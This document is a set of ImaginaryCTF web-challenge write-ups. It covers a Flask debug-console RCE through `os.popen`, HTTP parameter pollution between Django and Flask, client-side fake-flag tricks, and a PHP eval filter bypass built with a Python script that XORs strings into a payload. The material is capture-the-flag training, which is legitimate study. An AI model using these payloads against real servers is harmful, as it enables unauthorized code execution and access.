# Almost SSTI

## Description

I heard that you can prevent SSTI by enforcing really strong restrictions on user input length, so I've done that! Surely my webserver is now completely impregnable from any bugs.

## Attachments

`http://puzzler7.imaginaryctf.org:3002/`

## Solution

Trying basic jinja injection shows that the debug is set to True.

So going over to `/console` shows the python debugger console but without the pin.

We have access to RCE now!!

`__import__('os').popen(<cmd>).read();`

## flag 

`ictf{oops_I_left_my_debugger_on_I_need_to_run_home_before_my_webserver_burns_down}`

<br>

# Unchained

## Description

I've written so many Flask apps in the past, I thought I'd diversify a bit and try out Django! I wrote this Django app for you guys out of Django and nothing else so don't even bother looking!

## Attachments

`http://puzzler7.imaginaryctf.org:3006`

## Solution

The home page shows the source code of the page written in django

```
from django.shortcuts import render
from django.http import HttpResponse, FileResponse

from requests import get

# at /
def index(request):
    return HttpResponse(open(__file__, 'r').read(), content_type='text/plain')

# at /flag
def flag(request):
    user = request.GET.get('user', '')
    if user == 'admin':
        return HttpResponse("Hey, no impersonating admin!")
    url = request.build_absolute_uri().replace(request.build_absolute_uri('/'), '')
    r = get('http://0.0.0.0:1337/'+url)
    return HttpResponse(r.content)

# definitely not at /nothing_important_dont_look_here
def nothing_important_dont_look_here(request):
    return HttpResponse(get('http://0.0.0.0:1337').content, content_type='text/plain')
```

There is nothing in here that shows the flag.

But going over to `/nothing_important_dont_look_here` shows flask code!!

```
#!/usr/bin/env python3

from flask import Flask, Response, request

app = Flask(__name__)

# Ah, heck, you got me. It's been Flask the whole time!

@app.route('/')
def index():
    return Response(open(__file__).read(), mimetype='text/plain')

@app.route('/flag')
def flag():
    if 'user' not in request.args:
        return "User not logged in!"
    if request.args['user'] != 'admin':
        return "User is not admin!"
    return f"Welcome, {request.args['user']}! The flag is {open('flag.txt').read()}"
    
app.run('0.0.0.0', 1337)
```

If we pass the user parameter to be `admin`, we get the flag. But the issue here is that if the user is set to be admin, django filters it out..🤯

After extensive search it was found that this can be achieved by [HTTP Parameter Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution).

Here django interprets the last occurence of the parameter, whereas flask interprets first occurence.

So simply this url gives the flag.

```
http://puzzler7.imaginaryctf.org:3006/flag?user=admin&user=admi
```

## flag

`ictf{only_accessible_by_schroedinger's_admin}`

<br>



# Replacement

## Description

Red flags and fake flags form an equivalence class.

## Attachments

`ictf:f2e8b632f71c2cab`
`http://puzzler7.imaginaryctf.org:4003/`

## Solution

After logging in with the given creds, we see that there is a fake flag.
Checking the source code shows a directory `/totallynottheflag`.

When we try to access the directory, the flag is being showed for a sec and being replaced by the fake flag.

So disable the javascript and check the source code.
You can use [Burpsuite](https://portswigger.net/burp) also.

## flag 

`ictf{gr333333333333333n_flags_are_g00d_tho}`

<br>

# Backtracking

## Description

Look at how far you've come

## Attachments

`http://puzzler7.imaginaryctf.org:4007/`
`ictf:24dbcbffb8208024`

## Solution

Checking the source code shows us an obfuscated javascript code.
I have used this [deobfuscator](https://lelinhtinh.github.io/de4js/) which showed [history.pushState](https://www.javascripttutorial.net/web-apis/javascript-history-pushstate/).

This function adds the provided url to the history stack.
There appears to be a flag being added to the history stack, So simply clicking back button gives us the flag.

## flag

`ictf{it's_me_the_friend_you_made_along_the_way}`

<br>

# phpsucks

## Description

I have an eval but with a robust user input validation.

## Attachments

`http://puzzler7.imaginaryctf.org:4011/`

## Solution

Going over to the provided link shows a php code which is taking input from user by filtering alphanumeric characters and passing it to the eval.

The flag can be viewed if we can execute `secret_function()`.

The following script passes xor between two strings as input.

script

```
import requests
from Crypto.Util.strxor import strxor
import string

fun = "secret_function"
lis = """'_.@/{}()=*,-:<>?["]|"""
nope = string.ascii_lowercase + string.ascii_uppercase + string.digits
final = ""
final2 = ""

for let in fun:
    for i in lis:
        s = strxor(let.encode(), i.encode()).decode()
        if s not in nope and s in lis:
            final += s
            final2 += i
            break

payload = f"$_='{final}'^'{final2}';$_();"

url = f"http://puzzler7.imaginaryctf.org:4011/?cmd={payload}"
req = requests.get(url)
print(req.text[req.text.find('ictf'):])
```

## flag 

`ictf{th3r3_4r3_n0_l4ngu4g3_l1k3_Php}`

<br>

